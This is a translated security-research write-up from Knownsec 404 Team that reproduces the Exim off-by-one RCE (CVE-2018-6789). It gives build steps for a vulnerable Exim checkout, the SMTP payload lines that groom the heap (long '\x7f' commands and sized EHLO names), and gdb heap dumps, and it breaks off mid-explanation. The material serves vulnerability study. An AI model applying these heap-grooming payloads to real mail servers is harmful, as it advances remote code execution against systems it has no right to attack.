**Authorï¼šHcamael@Knownsec 404 Team**  
**Chinese Version:**
Not too long ago, meh dug an[ Exim RCE
vulnerability](https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/ " Exim RCE vulnerability"). The RCE vulnerability
is less constrained, as it can still be used even if PIE is enabled .
During the process of recurring the loophole, I have found that in the process
of the recurrence, the actual situation of the stack could not be constructed
as Meh described, and I was stuck here for a long time ( I guess it was
because of the different environment). Then I decided I should first
understand the general idea of meh before I construct the heap. The whole work
is difficult, but I made it at last.
#### Recurring Environment Construction
The environment is roughly the same as the last time. First, go to the [patch
commit](https://github.com/Exim/exim/commit/cf3cd306062a08969c41a1cdd32c6855f1abecf1
"patch commit") of the vulnerability on github.
Then switch the branch to the last commit
    $ git clone https://github.com/Exim/exim.git
    $ git checkout 38e3d2dff7982736f1e6833e06d4aab4652f337a
    $ cd src
    $ mkdir Local
Still use the last Makefile:
    $ cat Local/makefile | grep -v "#"
    BIN_DIRECTORY=/usr/exim/bin
    CONFIGURE_FILE=/usr/exim/configure
    EXIM_USER=ubuntu
    SPOOL_DIRECTORY=/var/spool/exim
    ROUTER_ACCEPT=yes
    ROUTER_DNSLOOKUP=yes
    ROUTER_IPLITERAL=yes
    ROUTER_MANUALROUTE=yes
    ROUTER_QUERYPROGRAM=yes
    ROUTER_REDIRECT=yes
    TRANSPORT_APPENDFILE=yes
    TRANSPORT_AUTOREPLY=yes
    TRANSPORT_PIPE=yes
    TRANSPORT_SMTP=yes
    LOOKUP_DBM=yes
    LOOKUP_LSEARCH=yes
    LOOKUP_DNSDB=yes
    PCRE_CONFIG=yes
    FIXED_NEVER_USERS=root
    AUTH_CRAM_MD5=yes
    AUTH_PLAINTEXT=yes
    AUTH_TLS=yes
    HEADERS_CHARSET="ISO-8859-1"
    SUPPORT_TLS=yes
    TLS_LIBS=-lssl -lcrypto
    SYSLOG_LOG_PID=yes
    EXICYCLOG_MAX=10
    COMPRESS_COMMAND=/usr/bin/gzip
    COMPRESS_SUFFIX=gz
    ZCAT_COMMAND=/usr/bin/zcat
    SYSTEM_ALIASES_FILE=/etc/aliases
    EXIM_TMPDIR="/tmp"
Compile and install:
    $ make -j8
    $ sudo make install
The startup is the same as last time. But when the debug is enabled, all debug
information is output, and if not so, the layout of the heap will be impacted.
However, although it has an impact, it only affects the details of the
structure. The overall construction idea is still as what meh wrote in his
paper.
The recurrence is based on a mode that only outputs partial debug information:
    $ /usr/exim/bin/exim -bdf -dd
    # Output complete debug information using -bdf -d+all
    # Do not open debug mode using -bdf
#### Vulnerability Recurrence
I think the description of the vulnerability principle and related functions
has been very detailed in meh's article, so I just wrote my recurrence
process.
##### STEP 1
First you need to construct a released chunk. It does not have to be of 0x6060
in size but only have to meet a few conditions:
This chunk is divided into three parts, one part is obtained by `store_get`,
which is used to store the base64 decoded data and cause the `off by one`
vulnerability to cover the size of the next chunk. The minimum chunk obtained
by `store_get` is 0x2000, and the heap header is 0x10 and the heap header
implented by exim is also 0x10. So it is a heap block of at least 0x2020.
The second part is used to put `sender_host_name`. Because the memory of this
variable is obtained by `store_malloc`, there is no size limit.
The third part is also a heap block of at least 0x2020 because it needs to
construct a fake chunk for the check of `free`.
Unlike meh, I get a 0x4041 heap by `unrecognized command` and then release it
with `EHLO`:
    p.sendline("\x7f"*4102)
    p.sendline("EHLO %s"%("c"*(0x2010)))
    # heap
    0x1d15180 PREV_INUSE {
      prev_size = 0x0,
      size = 0x4041,
      fd = 0x7f9520917b78,
      bk = 0x1d1b1e0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x1d191c0 {
      prev_size = 0x4040,
      size = 0x2020,
      fd = 0x6363636363636363,
      bk = 0x6363636363636363,
      fd_nextsize = 0x6363636363636363,
      bk_nextsize = 0x6363636363636363
    }
0x1d15180 is a chunk of size 0x4040 obtained by `unrecognized command`. It was
released after the `EHLO` command was excuted. 0x1d191c0 is the
`sender_host_name` of inuse. These two parts constitute a chunk of 0x6060.
##### STEP 2
The current situation is that `sender_host_name` is at the bottom of the
0x6060 chunk, and we need to move it to the middle.
This part of the idea is the same as meh, first of all occupy the top 0x2020
chunk with `unrecognized command`
The size of the memory is `ss = store_get(length + nonprintcount * 3 + 1);`
after `unrecognized command` is excuted.
By calculation, you only need to make `length + nonprintcount * 3 + 1 >
yield_length` to apply for a chunk with `store_get` function.
    P.sendline("\x7f"*0x800)
At this time we can use `EHLO` to release the previous `sender_host_name` and
then reset it so that `sender_host_name` is in the middle of the 0x6060 size
chunk.
    p.sendline("EHLO %s"%("c"*(0x2000-9)))
    # heap
    0x1d15180 PREV_INUSE {
      prev_size = 0x0,
      size = 0x2021,
      fd = 0x7f9520917b78,
      bk = 0x1d191a0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x1d171a0 {
      prev_size = 0x2020,
      size = 0x2000,
      fd = 0x6363636363636363,
      bk = 0x6363636363636363,
      fd_nextsize = 0x6363636363636363,
      bk_nextsize = 0x6363636363636363
    }
    0x1d191a0 PREV_INUSE {
      prev_size = 0x63636363636363,
      size = 0x6061,
      fd = 0x1d15180,
      bk = 0x7f9520917b78,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x1d1f200 {
      prev_size = 0x6060,
      size = 0x2020,
      fd = 0x1d27380,
      bk = 0x2008,
      fd_nextsize = 0x6363636363636328,
      bk_nextsize = 0x6363636363636363
    }
##### STEP 3
Now the layout of our heap is:
  * The first unused 0x2020 size chunk
  * The second 0x2000 size block is used as`sender_host_name`
  * The third block is a 0x6060 size chunk that has not been used. It will merge with the heap afterwards.
Let's go back and think about the setting of the size of each chunk.
###### CHUNK 1
The first chunk is used to trigger the `off by one` vulnerability, which is
used to modify the size of the second chunk, which can only overflow 1 byte.
`store_get` at least allocates a chunk of 0x2000 in size and can store data of
0x2000 in size.
This means if `store_get` is of its minimun size, you can only overflow the
pre_size bit of the second chunk.
Then because `(0x2008-1)%3==0`, we can exploit the vulnerability of b64decode
function and apply for a 0x2020 chunk that can store 0x2008 size of data, and
then overflow a byte to the `size` of the next chunk.
###### CHUNK2
As for the second chunk, because only one byte can be modified, so it can only